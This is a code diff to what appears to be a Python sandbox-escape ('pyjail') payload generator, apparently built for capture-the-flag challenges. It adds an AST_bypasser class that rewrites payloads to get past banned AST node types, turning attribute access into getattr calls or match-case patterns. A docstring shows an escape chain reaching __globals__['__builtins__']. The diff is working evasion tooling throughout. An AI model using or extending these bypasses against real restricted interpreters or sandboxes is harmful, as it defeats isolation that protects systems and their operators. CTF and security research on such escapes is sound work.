@@ -5,7 +5,7 @@ from copy import copy, deepcopy
 from random import randint, choice
 from functools import wraps, reduce
 from string import ascii_letters, digits
-from typing import Union, List, Optional
+from typing import Union, List, Optional, Tuple
 
 
 def remove_duplicate(List) -> list:
@@ -254,6 +254,11 @@ class BypassGenerator:
                     i = i.replace(tag_unicode, self.tags[j])
             output.append(i)
         output = remove_duplicate(output)
+        if self.banned_ast:
+            ast_bypasser = AST_bypasser(banned_ast=self.banned_ast, payload=true_payload, local_scope=self.local_scope)
+            result = ast_bypasser.generate_bypass()
+            if not result is None: 
+                output.append(result)
         for i in output:
             if not self.is_blacklisted(i):
                 return output  # in case of the challenge is easy
@@ -1436,3 +1441,319 @@ class BashBypassGenerator:
         # yield self.bashfuck_x(cmd, 'zero')
         # yield self.bashfuck_x(cmd, 'c')
         # yield self.bashfuck_y(cmd)
+
+def ast_bypasser(supported_ast: ast.AST):
+    """
+    Decorator for ast bypassers.
+    """
+
+    def _(func):
+        func.supported_ast = supported_ast
+        @wraps(func)
+        def check(self, payload):
+            try:
+                return func(self, payload)
+            except SyntaxError:
+                return None
+        return check
+    return _
+
+class AST_bypasser:
+    def __init__(self, banned_ast, payload, local_scope):
+        self.banned_ast = banned_ast
+        self.payload = payload
+        self.bypass_methods = {}
+        self.local_scope = local_scope
+        from .utils import find_object
+        self.find_object = find_object
+        for method_name in dir(self):
+            method = getattr(self, method_name)
+            if callable(method):
+                supported_ast = getattr(method, "supported_ast", False)
+                if supported_ast:
+                    if self.bypass_methods.get(supported_ast, None) is None:
+                        self.bypass_methods[supported_ast] = []
+                    self.bypass_methods[supported_ast].append(method)
+
+    def generate_bypass(self):
+        final_payload = None
+        bypassed_payload = self.payload
+        for i in self.banned_ast:
+            if i in self.bypass_methods:
+                bypassed = False
+                for method in self.bypass_methods[i]:
+                    bypassed_payload = method(bypassed_payload)
+                    if bypassed_payload is not None:
+                        final_payload = bypassed_payload
+                        bypassed = True
+                        break
+                if not bypassed:
+                    final_payload = None
+                    break
+            else:
+                final_payload = None
+                break
+        return final_payload
+
+    @ast_bypasser(ast.Attribute)
+    def attibute_to_getattr(self, payload):
+        """
+        'a.b' -> 'getattr(a, "b")'
+        """
+
+        name = self.find_object(getattr, self.local_scope)
+        if name is None:
+            return payload
+        tree = ast.parse(payload, mode="eval")
+
+        class Transformer(ast.NodeTransformer):
+            def visit_Attribute(self, node):
+                return ast.Call(
+                    func=ast.Name(id=name, ctx=ast.Load()),
+                    args=[self.visit(node.value), ast.Constant(value=node.attr)],
+                    keywords=[],
+                )
+        transformer = Transformer()
+        transformed_tree = transformer.visit(tree)
+        ast.fix_missing_locations(transformed_tree)
+        return ast.unparse(transformed_tree)
+
+    def attibute_to_match_case(self, payload):
+        """
+        dict.subclasses()[2].__globals__['__builtins__']
+        ->
+        match dict:
+            case object(__subclasses__=__cap1):
+                __out0 = __cap1
+        match __out0()[2]:
+            case object(update=__cap3):
+                match __cap3:
+                    case object(__globals__=__cap4):
+                        __out2 = __cap4
+        __out2['__builtins__']
+        """
+        from .Typhon import allowed_letters
+        from sys import version
+        sub_version = int(version.split('.')[1])
+        if sub_version <= 9:
+            return None
+        if not allowed_letters:
+            return None
+        name = self.find_object(object, self.local_scope)
+        if name is None:
+            return payload
+        def split_attr_chain(expr: ast.expr) -> Tuple[ast.expr, List[str]]:
+            attrs: List[str] = []
+            cur = expr
+            while isinstance(cur, ast.Attribute) and isinstance(cur.ctx, ast.Load):
+                attrs.append(cur.attr)
+                cur = cur.value
+            attrs.reverse()
+            return cur, attrs
+
+
+        def unparse_safe(node: ast.AST) -> str:
+            try:
+                return ast.unparse(node)
+            except Exception:
+                return "<expr>"
+
+        class ObjectMatchLowerer(ast.NodeTransformer):
+            def __init__(self):
+                super().__init__()
+                self._tmp_i = 0
+                self._prologue_stack: List[List[ast.stmt]] = []
+
+            def _tmp(self) -> str:
+                try:
+                    name = f"{allowed_letters[self._tmp_i]}"
+                except:
+                    name = allowed_letters[0]*self._tmp_i
+                self._tmp_i += 1
+                return name
+
+            def _emit(self, stmt: ast.stmt):
+                assert self._prologue_stack, "internal prologue stack empty"
+                self._prologue_stack[-1].append(stmt)
+
+            def _build_object_match_chain(
+                self,
+                subject_expr: ast.expr,
+                attrs: List[str],
+                out_name: str,
+                chain_text: str,
+                loc_from: ast.AST,
+            ) -> ast.Match:
+                attr0 = attrs[0]
+                cap_name = self._tmp()
+                cap_pat = ast.MatchAs(name=cap_name)
+
+                ok_body: List[ast.stmt]
+                if len(attrs) == 1:
+                    ok_body = [
+                        ast.Assign(
+                            targets=[ast.Name(id=out_name, ctx=ast.Store())],
+                            value=ast.Name(id=cap_name, ctx=ast.Load()),
+                        )
+                    ]
+                else:
+                    inner = self._build_object_match_chain(
+                        subject_expr=ast.Name(id=cap_name, ctx=ast.Load()),
+                        attrs=attrs[1:],
+                        out_name=out_name,
+                        chain_text=chain_text,
+                        loc_from=loc_from,
+                    )
+                    ok_body = [inner]
+
+                ok_case = ast.match_case(
+                    pattern=ast.MatchClass(
+                        cls=ast.Name(id=name, ctx=ast.Load()),
+                        patterns=[],
+                        kwd_attrs=[attr0],
+                        kwd_patterns=[cap_pat],
+                    ),
+                    guard=None,
+                    body=ok_body,
+                )
+
+                m = ast.Match(subject=subject_expr, cases=[ok_case])
+                ast.copy_location(m, loc_from)
+                return m
+
+            def _transform_block(self, body: List[ast.stmt]) -> List[ast.stmt]:
+                new: List[ast.stmt] = []
+                for stmt in body:
+                    self._prologue_stack.append([])
+                    new_stmt = self.visit(stmt)
+                    pro = self._prologue_stack.pop()
+                    new.extend(pro)
+                    if isinstance(new_stmt, list):
+                        new.extend(new_stmt)
+                    else:
+                        new.append(new_stmt)
+                return new
+
+            def visit_Module(self, node: ast.Module):
+                node.body = self._transform_block(node.body)
+                return node
+
+            def visit_FunctionDef(self, node: ast.FunctionDef):
+                node.body = self._transform_block(node.body)
+                return node
+
+            def visit_AsyncFunctionDef(self, node: ast.AsyncFunctionDef):
+                node.body = self._transform_block(node.body)
+                return node
+
+            def visit_ClassDef(self, node: ast.ClassDef):
+                node.body = self._transform_block(node.body)
+                return node
+
+            def visit_If(self, node: ast.If):
+                node.test = self.visit(node.test)
+                node.body = self._transform_block(node.body)
+                node.orelse = self._transform_block(node.orelse)
+                return node
+
+            def visit_While(self, node: ast.While):
+                node.test = self.visit(node.test)
+                node.body = self._transform_block(node.body)
+                node.orelse = self._transform_block(node.orelse)
+                return node
+
+            def visit_With(self, node: ast.With):
+                for item in node.items:
+                    item.context_expr = self.visit(item.context_expr)
+                    if item.optional_vars:
+                        item.optional_vars = self.visit(item.optional_vars)
+                node.body = self._transform_block(node.body)
+                return node
+
+            def visit_For(self, node: ast.For):
+                node.iter = self.visit(node.iter)
+                node.target = self.visit(node.target)
+                node.body = self._transform_block(node.body)
+                node.orelse = self._transform_block(node.orelse)
+                return node
+
+            def visit_AsyncFor(self, node: ast.AsyncFor):
+                node.iter = self.visit(node.iter)
+                node.target = self.visit(node.target)
+                node.body = self._transform_block(node.body)
+                node.orelse = self._transform_block(node.orelse)
+                return node
+
+            def visit_Try(self, node: ast.Try):
+                node.body = self._transform_block(node.body)
+                for h in node.handlers:
+                    if h.type:
+                        h.type = self.visit(h.type)
+                    h.body = self._transform_block(h.body)
+                node.orelse = self._transform_block(node.orelse)
+                node.finalbody = self._transform_block(node.finalbody)
+                return node
+
+            def visit_Assign(self, node: ast.Assign):
+                node.value = self.visit(node.value)
+                node.targets = [self.visit(t) for t in node.targets]
+                return node
+
+            def visit_AnnAssign(self, node: ast.AnnAssign):
+                if node.value:
+                    node.value = self.visit(node.value)
+                node.target = self.visit(node.target)
+                node.annotation = self.visit(node.annotation)
+                return node
+
+            def visit_AugAssign(self, node: ast.AugAssign):
+                node.value = self.visit(node.value)
+                node.target = self.visit(node.target)
+                return node
+
+            def visit_Return(self, node: ast.Return):
+                if node.value:
+                    node.value = self.visit(node.value)
+                return node
+
+            def visit_Expr(self, node: ast.Expr):
+                node.value = self.visit(node.value)
+                return node
+
+            def visit_Assert(self, node: ast.Assert):
+                node.test = self.visit(node.test)
+                if node.msg:
+                    node.msg = self.visit(node.msg)
+                return node
+
+            def visit_Lambda(self, node: ast.Lambda):
+                return node
+
+            def visit_Attribute(self, node: ast.Attribute):
+                if not isinstance(node.ctx, ast.Load):
+                    node.value = self.visit(node.value)
+                    return node
+
+                base, attrs = split_attr_chain(node)
+                if not attrs:
+                    node.value = self.visit(node.value)
+                    return node
+
+                base2 = self.visit(base)
+
+                out_name = self._tmp()
+                chain_text = ".".join([unparse_safe(base), *attrs])
+
+                m = self._build_object_match_chain(
+                    subject_expr=base2, attrs=attrs, out_name=out_name,
+                    chain_text=chain_text, loc_from=node
+                )
+                self._emit(m)
+
+                return ast.Name(id=out_name, ctx=ast.Load())
+        def transform_code(src: str) -> str:
+            tree = ast.parse(src)
+            new_tree = ObjectMatchLowerer().visit(tree)
+            ast.fix_missing_locations(new_tree)
+            return ast.unparse(new_tree)
+        return transform_code(payload)
